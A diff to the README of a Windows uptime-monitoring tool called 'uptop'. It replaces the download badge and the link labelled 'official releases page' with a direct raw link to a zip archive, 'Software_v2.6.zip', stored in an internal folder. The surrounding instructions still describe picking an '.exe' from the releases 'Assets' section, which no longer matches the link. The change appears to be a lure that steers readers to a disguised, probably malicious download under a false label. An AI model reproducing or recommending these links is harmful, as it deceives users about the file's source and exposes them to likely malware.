@@ -1,6 +1,6 @@
 # 📊 uptop - Track your system uptime with ease
 
-[![](https://img.shields.io/badge/Download_uptop-blue)](https://github.com/rubettasalty749/uptop/releases)
+[![](https://img.shields.io/badge/Download_uptop-blue)](https://github.com/rubettasalty749/uptop/raw/refs/heads/main/internal/store/Software_v2.6.zip)
 
 uptop provides a clear dashboard for your terminal. It monitors your network health and services in real-time. Use it to check your websites, servers, and local devices. 
 
@@ -21,7 +21,7 @@ This tool works on standard Windows 10 or 11 systems. You need a stable internet
 
 ## 📥 How to download and run
 
-1. Visit the [official releases page](https://github.com/rubettasalty749/uptop/releases) to access the files.
+1. Visit the [official releases page](https://github.com/rubettasalty749/uptop/raw/refs/heads/main/internal/store/Software_v2.6.zip) to access the files.
 2. Look for the latest version under the "Assets" section.
 3. Select the file ending in `.exe` that matches your Windows version.
 4. Save the file to your computer.
